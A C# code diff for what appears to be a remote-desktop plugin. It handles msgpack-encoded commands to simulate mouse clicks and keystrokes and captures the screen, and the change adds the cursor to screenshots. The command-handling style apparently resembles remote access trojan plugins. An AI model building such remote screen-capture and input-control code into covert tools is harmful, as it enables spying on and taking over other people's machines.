@@ -38,8 +38,8 @@ namespace Plugin
 
                             case "mouseClick":
                                 {
-                                    Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
-                                    Cursor.Position = position;
+                                    //Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
+                                   // Cursor.Position = position;
                                     mouse_event((Int32)unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
                                     break;
                                 }
@@ -128,9 +128,19 @@ namespace Plugin
             try
             {
                 Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
-                using (Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot))
+                using (Graphics graphics = Graphics.FromImage(bmpScreenshot))
                 {
-                    gfxScreenshot.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
+                    graphics.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
+                    CURSORINFO pci;
+                    pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));
+                    if (GetCursorInfo(out pci))
+                    {
+                        if (pci.flags == CURSOR_SHOWING)
+                        {
+                            DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
+                            graphics.ReleaseHdc();
+                        }
+                    }
                     return bmpScreenshot;
                 }
             }
@@ -142,5 +152,29 @@ namespace Plugin
 
         [DllImport("user32.dll")]
         internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct CURSORINFO
+        {
+            public Int32 cbSize;
+            public Int32 flags;
+            public IntPtr hCursor;
+            public POINTAPI ptScreenPos;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct POINTAPI
+        {
+            public int x;
+            public int y;
+        }
+
+        [DllImport("user32.dll")]
+        static extern bool GetCursorInfo(out CURSORINFO pci);
+
+        [DllImport("user32.dll")]
+        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
+        const Int32 CURSOR_SHOWING = 0x00000001;
+
     }
 }
